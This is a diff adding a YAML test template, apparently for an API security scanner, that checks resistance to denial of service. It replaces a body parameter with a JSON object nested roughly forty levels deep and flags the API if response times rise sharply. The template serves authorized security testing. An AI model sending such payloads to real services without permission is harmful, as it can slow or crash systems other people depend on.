@@ -1,0 +1,68 @@
+id: DOS_DEEPLY_NESTED_JSON_BODY
+info:
+  name: "Denial of Service test by entering a very deeply nested JSON body"
+  description: "In this Denial of Service (DoS) test, a deeply nested JSON body is crafted and submitted to the system to assess its resilience against complex data structures. By creating layers of nested objects and arrays, testers aim to evaluate how the system handles and processes such intricate inputs. This method helps identify potential vulnerabilities in JSON parsing and processing, aiding in fortifying the system's defenses against DoS attacks leveraging excessively complex data payloads."
+  details: "This test involves constructing a JSON body with multiple levels of nested objects and arrays, creating a highly complex data structure. By submitting this deeply nested JSON to the system, testers evaluate its ability to handle and process intricate data payloads. The goal is to uncover potential vulnerabilities in JSON parsing and processing mechanisms that could be exploited by attackers to disrupt system functionality through Denial of Service (DoS) attacks."
+  impact: "The impact of a successful Denial of Service (DoS) attack leveraging deeply nested JSON bodies can be significant. It may lead to system slowdowns, unresponsiveness, or even crashes due to the complexity of processing such intricate data structures. Consequently, users may experience service disruptions, impacting productivity and potentially causing reputational damage to the organization due to perceived system instability."
+  category:
+    name: RL
+    shortName: Lack of Resources & Rate Limiting
+    displayName: Lack of Resources & Rate Limiting (RL)
+  subCategory: DOS_DEEPLY_NESTED_JSON_BODY
+  severity: HIGH
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa4-unrestricted-resource-consumption.md"
+  cwe:
+    - CWE-400
+  cve:
+    - CVE-2023-4647
+    - CVE-2023-38254
+
+attributes:
+  nature: INTRUSIVE
+  plan: PRO
+  duration: SLOW
+
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+execute:
+  type: multiple
+  requests:
+    - req:
+        - add_header:
+            dummy_Header_Key: "dummyValue"
+        - validate:
+            percentage_match:
+              gte: 90
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_body_param:
+            userKey: "{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":{\"${userKey}\":\"${userVal}\"}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}"
+        - validate:
+            response_code:
+              gt: 505
+validate:
+  and:
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - 5001
+    - compare_greater:
+        - ${x2.response.stats.median_response_time}
+        - ${x1.response.stats.median_response_time} * 5
